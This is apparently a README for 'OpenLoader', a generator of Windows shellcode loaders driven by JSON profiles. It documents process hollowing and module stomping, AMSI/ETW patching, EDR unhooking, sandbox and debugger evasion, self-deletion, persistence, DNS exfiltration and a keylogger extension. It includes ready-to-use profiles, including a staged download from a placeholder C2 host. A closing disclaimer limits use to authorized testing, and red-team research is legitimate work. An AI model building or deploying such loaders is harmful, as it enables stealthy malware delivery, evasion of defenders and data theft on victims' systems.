# OpenLoader — Profile-Driven PE Loader for Shellcode

> **One JSON. Every Knob. Zero Guesswork: Injection, Evasion, Permissions, Extensions.**

OpenLoader is a **PE loader generator** that embeds and executes **shellcode** on Windows. A single JSON configuration file controls everything: injection method, evasion techniques (AMSI/ETW bypass), anti-debugging, section permissions, encryption, persistence, and custom C++ extensions. Cross-compiles via **MinGW** to produce **.exe** or **.bin** targeting **x86_64 Windows**.

---

## Table of Contents

- [Features](#features)
- [System Requirements](#system-requirements)
- [Installation](#installation)
  - [Automatic Install](#automatic-install)
  - [Manual Install](#manual-install)
- [Usage](#usage)
  - [Quickstart: Stageless Mode](#quickstart-stageless-mode)
  - [Staged Mode (Download from C2)](#staged-mode-download-from-c2)
  - [Full JSON Profile Mode](#full-json-profile-mode)
- [JSON Profile Reference](#json-profile-reference)
  - [meta](#meta)
  - [payload](#payload)
  - [pe — PE Configuration](#pe--pe-configuration)
  - [injection — Injection Configuration](#injection--injection-configuration)
  - [evasion — Evasion Configuration](#evasion--evasion-configuration)
  - [anti_debug — Anti-Debugging](#anti_debug--anti-debugging)
  - [sleep — Sleep Obfuscation](#sleep--sleep-obfuscation)
  - [reflective — Reflective DLL](#reflective--reflective-dll)
  - [migration — Process Migration](#migration--process-migration)
  - [persistence — Persistence](#persistence--persistence)
  - [network — Custom Network Protocols](#network--custom-network-protocols)
  - [edr — Anti-EDR / Endpoint Detection](#edr--anti-edr--endpoint-detection)
  - [encryption — Encryption](#encryption--encryption)
  - [compiler — Compiler Settings](#compiler--compiler-settings)
  - [output — Output](#output--output)
  - [extensions — C++ Extensions](#extensions--c-extensions)
- [Example Profile](#example-profile)
- [Project Structure](#project-structure)
- [License](#license)

---

## Features

- **Two shellcode delivery modes:**
  - **Stageless** — Embeds shellcode directly into the PE, decrypts and executes immediately
  - **Staged** — Downloads shellcode from a C2 server via HTTPS (WinHTTP), with retry, proxy, and multi-stage fallback URLs

- **4 Injection Methods:**
  - `module_stomping` — Overwrite a loaded module
  - `section_mapping` — Map a section
  - `thread_hijacking` — Hijack a running thread
  - `process_hollowing` — Create a suspended process and overwrite

- **Deep Evasion:**
  - **AMSI** bypass (AmsiScanBuffer)
  - **ETW** bypass (EtwEventWrite)
  - Stack spoofing with configurable depth
  - Polymorphic junk code — unique every build
  - Self-delete (remove file after execution)
  - String obfuscation via AES-CBC

- **Anti-Debugging & Sandbox Detection:**
  - PEB checks (BeingDebugged, NtGlobalFlag)
  - Timing checks
  - Hardware Breakpoint (HWBP) detection
  - Sandbox detection (min CPU, RAM, disk, uptime)
  - Delayed execution + jitter
  - API hammer (confuse analyzers)

- **Anti-EDR:**
  - Indirect syscalls instead of direct API calls
  - Call stack spoofing
  - DLL unhooking (ntdll, kernel32, ...)
  - Runtime ETW/AMSI patching

- **Sleep Obfuscation:**
  - Encrypt memory regions during sleep (AES, XOR, ChaCha20, RC4)
  - Random jitter to avoid pattern detection

- **Advanced Features:**
  - Process migration (move to another process)
  - Persistence (Registry, Scheduled Task, WMI, Startup Folder)
  - Custom network protocols (HTTP, DNS, ICMP, SMB)
  - C++ extensions — inject custom code into the loader
  - Reflective DLL loading support

- **Code Security:**
  - API names hashed with **djb2** (no plaintext strings)
  - XOR/AES encryption for all sensitive strings
  - XOR-masked keys to prevent static extraction
  - Random PE section renaming

---

## System Requirements

| Component                 | Description                       |
|---------------------------|-----------------------------------|
| Python                    | 3.8 or later                      |
| MinGW-w64 cross-compiler  | `x86_64-w64-mingw32-g++`         |
| Build OS                  | Linux (recommended)               |
| Target                    | Windows x86_64 (.exe / .bin)      |

Debian/Ubuntu dependencies:

```bash
sudo apt-get install -y mingw-w64 python3 python3-pip
```

---

## Installation

### Automatic Install

```bash
git clone https://github.com/your-org/OpenLoader.git
cd OpenLoader
chmod +x install.sh && ./install.sh
```

The script will:
- Install Python dependencies
- Check for and offer to install MinGW cross-compiler
- Verify the installation

### Manual Install

```bash
# Clone the repository
git clone https://github.com/your-org/OpenLoader.git
cd OpenLoader

# Install Python package
pip3 install -e .

# Install MinGW cross-compiler (skip if already present)
sudo apt-get install -y mingw-w64

# Verify
python3 -c "from src.generator import main; print('OK')"
```

---

## Usage

### Quickstart: Stageless Mode

Generate a PE loader with an embedded shellcode file in a single command:

```bash
python3 src/generator.py --payload ifrit.bin -o output/agent.exe
```

Result: `output/agent.exe` containing the encrypted `ifrit.bin` shellcode, ready to execute with default evasion settings.

---

### Staged Mode (Download from C2)

Create a JSON profile with a `staged` payload type:

```json
{
  "meta": { "name": "Stager", "version": "1.0" },
  "payload": {
    "type": "staged",
    "url": "https://c2.example.com/payload.bin",
    "timeout_sec": 30,
    "max_size_mb": 10,
    "stage_retry": 3,
    "stage_retry_delay_ms": 2000
  },
  "output": { "path": "output/stager.exe", "type": "exe" }
}
```

Run:

```bash
python3 src/generator.py -c staged_profile.json
```

The loader will:
1. Connect to C2 via HTTPS
2. Download the encrypted shellcode
3. Decrypt it with the generated XOR key
4. Inject into the target process

---

### Full JSON Profile Mode

The most powerful and flexible mode — a single JSON file defines every aspect of the loader:

```bash
python3 src/generator.py -c malleable_profile.json -o output/custom_loader.exe
```

CLI arguments:

| Flag               | Description                            |
|--------------------|----------------------------------------|
| `-c, --config`     | Path to JSON profile file              |
| `-p, --payload`    | Shellcode .bin file (stageless quick)  |
| `-o, --output`     | Output file path                       |

---

## JSON Profile Reference

Every field has a sensible default — you only need to declare what you want to customize.

### meta

Payload identification metadata.

```json
{
  "meta": {
    "name": "AgentName",
    "version": "1.0"
  }
}
```

| Field     | Default | Description  |
|-----------|---------|--------------|
| `name`    | Agent   | Agent name   |
| `version` | 1.0     | Version      |

---

### payload

Controls shellcode source and delivery method.

```json
{
  "payload": {
    "type": "stageless",
    "file": "shellcode.bin",
    "url": "https://c2.example.com/payload.bin",
    "max_size_mb": 10,
    "timeout_sec": 30,
    "proxy": "",
    "format": "bin",
    "dll_export": "DllMain",
    "dll_args": "",
    "stage_url": "",
    "stage_fallback_urls": [],
    "stage_aes_key": "",
    "stage_aes_iv": "",
    "stage_retry": 3,
    "stage_retry_delay_ms": 2000,
    "stage_user_agent": "Mozilla/5.0",
    "stage_headers": {},
    "stage_verify_cert": false,
    "stage_max_size_mb": 50,
    "stage_timeout_sec": 30,
    "stage_proxy": "",
    "stage_fingerprint": "",
    "stages": []
  }
}
```

| Field                   | Default        | Description                                          |
|-------------------------|----------------|------------------------------------------------------|
| `type`                  | `stageless`    | `stageless` or `staged`                              |
| `file`                  | `""`           | Shellcode file path (stageless)                      |
| `url`                   | `""`           | Payload download URL (staged)                        |
| `max_size_mb`           | 10             | Max payload size (MB)                                |
| `timeout_sec`           | 30             | Download timeout                                     |
| `proxy`                 | `""`           | HTTP proxy for staged                                |
| `format`                | `bin`          | Payload format: `bin`, `dll`, `pe`                   |
| `dll_export`            | `DllMain`      | Export function if payload is a DLL                  |
| `dll_args`              | `""`           | Arguments for the DLL entry point                    |
| `stage_url`             | `""`           | Primary stage URL (takes precedence over `url`)      |
| `stage_fallback_urls`   | `[]`           | Fallback URL list                                    |
| `stage_aes_key`         | `""`           | AES key for staging (16 byte hex)                    |
| `stage_aes_iv`          | `""`           | AES IV for staging (16 byte hex)                     |
| `stage_retry`           | 3              | Number of download retry attempts                    |
| `stage_retry_delay_ms`  | 2000           | Delay between retries (ms)                           |
| `stage_user_agent`      | `Mozilla/5.0`  | User-Agent header                                    |
| `stage_headers`         | `{}`           | Custom HTTP headers                                  |
| `stage_verify_cert`     | false          | Verify TLS certificate                               |
| `stage_max_size_mb`     | 50             | Max stage payload size (MB)                          |
| `stage_timeout_sec`     | 30             | Stage download timeout                               |
| `stage_proxy`           | `""`           | Proxy for stage download                             |
| `stage_fingerprint`     | `""`           | Expected SHA-256 hash (32 byte hex)                  |
| `stages`                | `[]`           | Multi-stage chain                                    |

#### Multi-stage chain (stages)

```json
{
  "stages": [
    {
      "url": "https://c2.example.com/stage1.bin",
      "decrypt_key": "a1b2c3d4...",
      "algo": "aes",
      "inject_method": "module_stomping",
      "wait_ms": 5000
    }
  ]
}
```

| Field          | Description                             |
|----------------|-----------------------------------------|
| `url`          | Stage download URL                      |
| `decrypt_key`  | Decryption key (hex)                    |
| `algo`         | Algorithm: `aes`, `xor`, `chacha20`, `rc4` |
| `inject_method`| Injection method for this stage         |
| `wait_ms`      | Delay before fetching next stage        |

---

### pe — PE Configuration

```json
{
  "pe": {
    "subsystem": "gui",
    "rename_sections": true,
    "section_list": [".text", ".data", ".rdata", ".pdata", ".xdata", ".bss", ".idata", ".edata"],
    "sections": {
      ".text": "RX",
      ".data": "RW",
      ".rdata": "RX",
      ".pdata": "RX",
      ".payload": "RWX"
    }
  }
}
```

| Field             | Default | Description                                              |
|-------------------|---------|----------------------------------------------------------|
| `subsystem`       | `gui`   | `gui` or `console`                                       |
| `rename_sections` | true    | Randomly rename sections to evade signature detection    |
| `section_list`    | [...]   | Section names used for renaming                          |
| `sections`        | ...     | Permissions per section                                  |

**Valid permissions:** `RX`, `RW`, `RWX`, `R`, `X`, `NONE`

---

### injection — Injection Configuration

```json
{
  "injection": {
    "method": "module_stomping",
    "dll": "ntdll.dll",
    "pid": 0,
    "alloc": "RWX",
    "exec": "RX",
    "prefix": "\\KnownDlls\\",
    "hollow_path": "C:\\Windows\\System32\\rundll32.exe"
  }
}
```

| Field         | Default                        | Description                                                   |
|---------------|--------------------------------|---------------------------------------------------------------|
| `method`      | `module_stomping`              | `module_stomping`, `section_mapping`, `thread_hijacking`, `process_hollowing` |
| `dll`         | `ntdll.dll`                    | Target DLL for module stomping                                |
| `pid`         | 0                              | Target PID (0 = auto-select suitable process)                 |
| `alloc`       | `RWX`                          | Allocation memory permission                                  |
| `exec`        | `RX`                           | Execution memory permission                                   |
| `prefix`      | `\\KnownDlls\\`                | Path prefix for module stomping                               |
| `hollow_path` | `C:\\Windows\\System32\\rundll32.exe` | Target process for process hollowing                   |

---

### evasion — Evasion Configuration

```json
{
  "evasion": {
    "amsi": true,
    "etw": true,
    "stack": true,
    "spoof_depth": 4,
    "junk": true,
    "obfuscate": true,
    "self_del": false,
    "self_del_method": 0,
    "self_del_handle": 4,
    "obf_key": 154,
    "retry_count": 3,
    "retry_delay_ms": 2000,
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "download_buf": 8192
  }
}
```

| Field             | Default         | Description                                            |
|-------------------|-----------------|--------------------------------------------------------|
| `amsi`            | true            | Bypass AMSI                                            |
| `etw`             | true            | Bypass ETW                                             |
| `stack`           | true            | Stack spoofing                                         |
| `spoof_depth`     | 4               | Stack spoof depth (1-64)                               |
| `junk`            | true            | Generate polymorphic junk code                         |
| `obfuscate`       | true            | String obfuscation                                     |
| `self_del`        | false           | Self-delete after execution                            |
| `self_del_method` | 0               | 0 = `DeleteFile`, 1 = `cmd /c del`                     |
| `self_del_handle` | 4               | Handle index for self-delete                           |
| `obf_key`         | 0x9A            | XOR key for string obfuscation (1-255)                 |
| `retry_count`     | 3               | Download retry attempts (0-100)                        |
| `retry_delay_ms`  | 2000            | Retry delay (ms, 0-60000)                              |
| `user_agent`      | `Mozilla/5.0...`| User-Agent for HTTP requests                          |
| `download_buf`    | 8192            | Download buffer size (256-1048576 bytes)              |

---

### anti_debug — Anti-Debugging

```json
{
  "anti_debug": {
    "peb": true,
    "timing": true,
    "hwbp": true,
    "sandbox": true,
    "min_cpu": 2,
    "min_ram_mb": 2048,
    "min_disk_gb": 60,
    "min_uptime_min": 30,
    "delayed_ms": 5000,
    "delay_jitter": 30,
    "hammer": 10
  }
}
```

| Field            | Default | Description                                                  |
|------------------|---------|--------------------------------------------------------------|
| `peb`            | true    | Check PEB (BeingDebugged, NtGlobalFlag)                      |
| `timing`         | true    | Execution timing check                                       |
| `hwbp`           | true    | Scan for hardware breakpoints                                |
| `sandbox`        | true    | Sandbox / VM detection                                       |
| `min_cpu`        | 2       | Minimum CPU cores (fewer = likely sandbox)                   |
| `min_ram_mb`     | 2048    | Minimum RAM (MB)                                             |
| `min_disk_gb`    | 60      | Minimum disk size (GB)                                       |
| `min_uptime_min` | 30      | Minimum system uptime (minutes)                              |
| `delayed_ms`     | 5000    | Initial execution delay (ms, 0 = no delay)                   |
| `delay_jitter`   | 30      | Jitter percentage (taken from `delayed_ms`)                  |
| `hammer`         | 10      | API hammer: spam meaningless API calls to confuse analyzers  |

---

### sleep — Sleep Obfuscation

```json
{
  "sleep": {
    "enabled": true,
    "ms": 5000,
    "jitter": 30,
    "obfuscate": "aes"
  }
}
```

| Field       | Default | Description                                                         |
|-------------|---------|---------------------------------------------------------------------|
| `enabled`   | true    | Enable/disable sleep obfuscation                                    |
| `ms`        | 5000    | Sleep duration (ms, 0 - 86400000)                                   |
| `jitter`    | 30      | Jitter (% of `ms`)                                                  |
| `obfuscate` | `aes`   | Memory encryption during sleep: `aes`, `xor`, `chacha20`, `rc4`, `none` |

---

### reflective — Reflective DLL

```json
{
  "reflective": {
    "clear_headers": true,
    "resolve_imports": true,
    "process_relocs": true,
    "enable_tls": true
  }
}
```

| Field             | Default | Description                                    |
|-------------------|---------|------------------------------------------------|
| `clear_headers`   | true    | Wipe PE headers after loading                  |
| `resolve_imports` | true    | Auto-resolve imports                           |
| `process_relocs`  | true    | Process relocations                            |
| `enable_tls`      | true    | Execute TLS callbacks if present               |

---

### migration — Process Migration

```json
{
  "migration": {
    "enabled": false,
    "target_process": "explorer.exe",
    "target_pid": 0,
    "method": "module_stomping",
    "trigger": "after_exec",
    "retry_count": 3,
    "self_delete_after": false
  }
}
```

| Field               | Default          | Description                                                              |
|---------------------|------------------|--------------------------------------------------------------------------|
| `enabled`           | false            | Enable/disable migration                                                 |
| `target_process`    | `explorer.exe`   | Target process name                                                      |
| `target_pid`        | 0                | Target PID (0 = auto-find by name)                                       |
| `method`            | `module_stomping`| Injection method for migration                                           |
| `trigger`           | `after_exec`     | Migration trigger: `after_exec`, `on_detection`, `on_sleep`             |
| `retry_count`       | 3                | Migration retry attempts                                                 |
| `self_delete_after` | false            | Delete original file after migration                                     |

---

### persistence — Persistence

```json
{
  "persistence": {
    "enabled": false,
    "method": "registry",
    "key": "OpenLoader",
    "path": "",
    "hide_file": true,
    "delay_minutes": 10,
    "max_runs": 0
  }
}
```

| Field           | Default      | Description                                                               |
|-----------------|--------------|---------------------------------------------------------------------------|
| `enabled`       | false        | Enable persistence                                                        |
| `method`        | `registry`   | `registry`, `scheduled_task`, `wmi`, `startup_folder`                    |
| `key`           | `OpenLoader` | Registry key name or task name                                            |
| `path`          | `""`         | File path to persist (blank = auto-detect)                                |
| `hide_file`     | true         | Hide the persisted file                                                   |
| `delay_minutes` | 10           | Delay before re-launch (minutes)                                          |
| `max_runs`      | 0            | Maximum execution count (0 = unlimited)                                   |

---

### network — Custom Network Protocols

```json
{
  "network": {
    "protocol": "http",
    "dns_server": "8.8.8.8",
    "dns_domain": "",
    "dns_type": "txt",
    "icmp_identifier": 4660,
    "smb_share": "",
    "smb_username": "",
    "smb_password": ""
  }
}
```

| Field            | Default   | Description                                          |
|------------------|-----------|------------------------------------------------------|
| `protocol`       | `http`    | `http`, `dns`, `icmp`, `smb`                        |
| `dns_server`     | `8.8.8.8` | DNS server for DNS protocol                          |
| `dns_domain`     | `""`      | Domain for DNS exfiltration                          |
| `dns_type`       | `txt`     | DNS record type: `txt`, `a`, `mx`, `null`           |
| `icmp_identifier`| `0x1234`  | ICMP identifier                                      |
| `smb_share`      | `""`      | SMB share path                                       |
| `smb_username`   | `""`      | SMB username                                         |
| `smb_password`   | `""`      | SMB password                                         |

---

### edr — Anti-EDR / Endpoint Detection

```json
{
  "edr": {
    "delay_api_calls": true,
    "call_spoofing": true,
    "rop_chain": false,
    "syscall_indirect": true,
    "patch_etw": true,
    "patch_amsi": true,
    "bypass_userland_hooks": true,
    "unhook_dlls": ["ntdll.dll", "kernel32.dll"],
    "syscall_whitelist": []
  }
}
```

| Field                 | Default | Description                                         |
|-----------------------|---------|-----------------------------------------------------|
| `delay_api_calls`     | true    | Introduce delays between API calls                  |
| `call_spoofing`       | true    | Spoof call stack                                    |
| `rop_chain`           | false   | Use ROP chains                                      |
| `syscall_indirect`    | true    | Use indirect syscalls (bypass ntdll hooks)          |
| `patch_etw`           | true    | Patch ETW at runtime                                |
| `patch_amsi`          | true    | Patch AMSI at runtime                               |
| `bypass_userland_hooks` | true  | Bypass userland hooks                               |
| `unhook_dlls`         | `[]`    | List of DLLs to unhook                              |
| `syscall_whitelist`   | `[]`    | Syscall number whitelist                            |

---

### encryption — Encryption

```json
{
  "encryption": {
    "algo": "xor",
    "key_source": "random",
    "fixed_key": "",
    "derived_from": "",
    "iv": "",
    "rounds": 1
  }
}
```

| Field          | Default  | Description                                                |
|----------------|----------|------------------------------------------------------------|
| `algo`         | `xor`    | `xor`, `aes`, `chacha20`, `rc4`                           |
| `key_source`   | `random` | `random`, `fixed`, `derived`                              |
| `fixed_key`    | `""`     | Fixed key (hex, used when `key_source = fixed`)            |
| `derived_from` | `""`     | Key derivation source (machine GUID, hostname, ...)        |
| `iv`           | `""`     | Initialization vector (hex)                                |
| `rounds`       | 1        | Encryption rounds (1-100)                                  |

---

### compiler — Compiler Settings

```json
{
  "compiler": {
    "cc": "x86_64-w64-mingw32-g++",
    "flags": "-std=gnu++20 -O3 -Wall -s -fno-ident -lkernel32 -static-libgcc -static-libstdc++ -static -mwindows"
  }
}
```

| Field   | Default                         | Description                               |
|---------|---------------------------------|-------------------------------------------|
| `cc`    | `x86_64-w64-mingw32-g++`       | Cross-compiler C++ binary                 |
| `flags` | (see above)                     | Compiler flags (optimized, static, stripped) |

---

### output — Output

```json
{
  "output": {
    "path": "output/agent.exe",
    "type": "exe"
  }
}
```

| Field  | Default              | Description              |
|--------|----------------------|--------------------------|
| `path` | `output/agent.exe`   | Output file path         |
| `type` | `exe`                | `exe` or `bin`          |

---

### extensions — C++ Extensions

Inject custom C++ code into the loader. Each extension is a `.hpp` or `.cpp` file injected at a specified position in the loader source before compilation.

```json
{
  "extensions": [
    {
      "name": "Keylogger",
      "path": "extensions/keylogger.hpp",
      "enabled": true,
      "compile_after": false,
      "inject_to": "loader.cpp",
      "position": "after_evasion",
      "config": {
        "log_path": "C:\\Users\\Public\\log.txt",
        "interval_ms": "500"
      }
    }
  ]
}
```

| Field           | Default          | Description                                                     |
|-----------------|------------------|-----------------------------------------------------------------|
| `name`          | `""`             | Extension name                                                  |
| `path`          | `""`             | Path to `.hpp` / `.cpp` file                                    |
| `enabled`       | true             | Enable/disable this extension                                   |
| `compile_after` | false            | Also compile `.cpp` files in the same directory                 |
| `inject_to`     | `loader.cpp`     | Target file for `#include` injection                            |
| `position`      | `after_evasion`  | Injection position (uses placeholders in loader source)         |
| `config`        | `{}`             | Custom config values (exposed as `#define EXT_<NAME>_<KEY>`)    |

---

## Example Profile

A complete, ready-to-use profile:

```json
{
  "$schema": "openloader-1.0",
  "meta": {
    "name": "DemoAgent",
    "version": "1.0"
  },
  "payload": {
    "type": "stageless",
    "file": "shellcode.bin",
    "max_size_mb": 10,
    "timeout_sec": 30
  },
  "pe": {
    "subsystem": "gui",
    "rename_sections": true,
    "sections": {
      ".text": "RX",
      ".data": "RW",
      ".payload": "RWX"
    }
  },
  "injection": {
    "method": "module_stomping",
    "dll": "ntdll.dll",
    "pid": 0
  },
  "evasion": {
    "amsi": true,
    "etw": true,
    "stack": true,
    "spoof_depth": 4,
    "junk": true,
    "obfuscate": true,
    "self_del": true,
    "self_del_method": 0
  },
  "anti_debug": {
    "peb": true,
    "timing": true,
    "hwbp": true,
    "sandbox": true,
    "min_cpu": 2,
    "min_ram_mb": 2048,
    "min_disk_gb": 60,
    "delayed_ms": 5000,
    "delay_jitter": 30,
    "hammer": 10
  },
  "sleep": {
    "enabled": true,
    "ms": 5000,
    "jitter": 30,
    "obfuscate": "aes"
  },
  "edr": {
    "syscall_indirect": true,
    "patch_etw": true,
    "patch_amsi": true,
    "bypass_userland_hooks": true,
    "unhook_dlls": ["ntdll.dll", "kernel32.dll"]
  },
  "encryption": {
    "algo": "xor",
    "key_source": "random"
  },
  "compiler": {
    "cc": "x86_64-w64-mingw32-g++",
    "flags": "-std=gnu++20 -O3 -Wall -s -fno-ident -lkernel32 -static-libgcc -static-libstdc++ -static -mwindows"
  },
  "output": {
    "path": "output/agent.exe",
    "type": "exe"
  }
}
```

Save as `profile.json` and run:

```bash
python3 src/generator.py -c profile.json
```

---

## Project Structure

```
OpenLoader/
├── README.md
├── install.sh
├── run.sh
├── setup.py
├── configs/
├── output/
├── generated_bins/
├── src/
│   ├── __init__.py
│   ├── generator.py           # Main CLI entry point
│   ├── core/
│   │   ├── __init__.py
│   │   ├── config_parser.py   # JSON profile parser & validator
│   │   ├── payload.py         # Shellcode processing (read, encrypt)
│   │   └── crypto.py          # AES, XOR, djb2 hash, obfuscation
│   ├── generators/
│   │   ├── __init__.py
│   │   ├── base.py            # Base generator (compile, template processing)
│   │   ├── stageless.py       # Stageless loader generator
│   │   └── staged.py          # Staged loader generator
│   ├── templates/             # C++ loader templates
│   │   ├── loader.cpp
│   │   ├── syscalls.hpp
│   │   ├── evasion.hpp
│   │   ├── injection.hpp
│   │   ├── aes.hpp
│   │   ├── obfuscation.hpp
│   │   └── sys.s
│   └── utils/
│       ├── __init__.py
│       └── helpers.py         # Color output, checksums, validation
└── old/
```

---

## License

This project is released under the **MIT License**. See `LICENSE` for details.

---

> **Disclaimer:** This tool is developed for security research, authorized penetration testing, and educational purposes only. Users are solely responsible for their use of this tool. Only use on systems you own or have explicit written permission to test.
